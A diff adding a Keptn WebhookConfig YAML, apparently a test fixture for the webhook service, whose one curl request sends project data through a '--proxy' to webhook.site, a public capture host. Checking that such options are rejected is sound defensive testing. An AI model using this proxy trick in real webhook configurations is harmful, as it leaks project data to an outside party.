@@ -1,0 +1,13 @@
+apiVersion: webhookconfig.keptn.sh/v1alpha1
+kind: WebhookConfig
+metadata:
+  name: webhook-configuration
+spec:
+  webhooks:
+    - type: sh.keptn.event.je-deployment.finished
+      requests:
+        - >-
+          curl --request GET --proxy http://webhook.site --data '{{.data.project}}' https://developer.pagerduty.com/
+      subscriptionID: e59377a6-eecd-453d-b74f-ca45233ca08a
+      sendFinished: false
+      sendStarted: false
